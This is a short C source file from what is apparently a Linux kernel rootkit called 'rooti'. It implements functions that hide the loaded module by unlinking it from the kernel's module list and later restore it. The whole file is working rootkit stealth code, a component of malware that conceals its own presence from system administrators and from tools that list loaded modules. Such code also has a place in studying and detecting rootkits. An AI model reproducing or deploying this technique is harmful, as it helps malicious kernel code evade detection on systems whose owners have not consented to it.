#include <linux/module.h>
#include <linux/types.h>
#include "mod_hiding.h"

/* 
 * Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
 * When hidden, the variable prev_module stores the address of the node that was previously
 * before this module in the list, otherwise it is NULL.
*/
bool rooti_hidden = false;
static struct list_head *prev_module = NULL;

/*
    Hides this rootkit by removing it from the kernel modules list.
*/
void rooti_hideme()
{
    rooti_hidden = true;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/*
    Reveals this rootkit by re-adding it to the kernel modules list.
*/
void rooti_showme()
{
    rooti_hidden = false;
    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
}